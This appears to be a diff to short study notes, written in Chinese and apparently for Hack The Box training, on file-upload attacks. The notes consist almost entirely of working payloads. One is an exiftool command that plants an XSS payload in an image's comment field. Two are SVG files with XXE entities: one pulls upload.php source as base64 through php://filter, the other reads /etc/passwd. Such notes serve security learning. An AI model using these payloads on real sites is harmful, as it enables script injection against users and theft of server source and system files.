@@ -9,3 +9,22 @@
 svg 的內容 -> XSS
 
 `exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg`
+
+
+XML
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
+<svg>&xxe;</svg>
+```
+
+base64 upload.php的源代碼
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+```
+
+讀//etc/passwd
